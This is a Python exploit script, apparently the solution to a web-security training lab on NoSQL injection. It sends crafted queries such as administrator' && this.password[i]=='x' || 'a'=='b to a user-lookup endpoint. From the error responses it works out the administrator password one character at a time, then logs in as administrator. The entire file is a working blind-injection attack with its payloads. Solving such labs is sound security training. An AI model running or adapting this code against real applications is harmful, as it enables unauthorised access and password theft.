#!/usr/bin/env python3
import argparse
import string
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
def get_csrf_from_html(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]

def login(session: requests.Session, base_url: str, username: str, password: str):
    login_url = urljoin(base_url, "/login")

    r = session.get(login_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_html(r.text)

    data = {
        "csrf": csrf,
        "username": username,
        "password": password,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = session.post(login_url, data=data, headers=headers, timeout=10)
    r.raise_for_status()

def is_user_not_found(response_json: dict) -> bool:
    """
    Returns True if the JSON response indicates 'Could not find user'.
    Expected format: { "message": "Could not find user" }
    """

    # Defensive: ensure it's actually a dict
    if not isinstance(response_json, dict):
        return False

    # Check the "message" field
    message = response_json.get("message", "")
    return isinstance(message, str) and "Could not find user" in message
def bruteforce_length(session: requests.Session, base_url: str):
    length = 15

    while length > 0:
        lookup_url = urljoin(base_url, f"/user/lookup?user=administrator'+%26%26+this.password.length+<+{length}+||+'a'%3d%3d'b")
        r = session.get(lookup_url, timeout=10)
        r.raise_for_status()
        if is_user_not_found(r.json()):
            return length
        else:
            length -= 1

    return 0

def bruteforce_password(session: requests.Session, base_url: str, length: int, username: str = "administrator"):
    password = ''

    for i in range(length):
        for x in chars:
            lookup_url = urljoin(base_url, f"/user/lookup?user={username}'+%26%26+this.password[{i}]+%3d%3d+'{x}'+||+'a'%3d%3d'b")
            r = session.get(lookup_url, timeout=10)
            r.raise_for_status()
            if is_user_not_found(r.json()) is False:
                password += x
                print(f"{i} symbol guessed - {x}")
                continue
    return password
def get_password(session: requests.Session, base_url: str):
    # Step 2: Bruteforce length
    length = bruteforce_length(session, base_url)
    print(length)

    # Step 3: Bruteforce password
    password = bruteforce_password(session, base_url, length)
    print(f"[+] Password is {password}")

    return password

def main():
    parser = argparse.ArgumentParser(
        description="Lab: Exploiting NoSQL injection to extract data"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    # Step 1: Login as wiener:peter
    login(sess, base_url, "wiener", "peter")

    print("[*] Exploiting vulnerability...")
    password = get_password(sess, base_url)
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")

    # Step 4: Login
    login(sess, base_url, "administrator", password)


if __name__ == "__main__":
    main()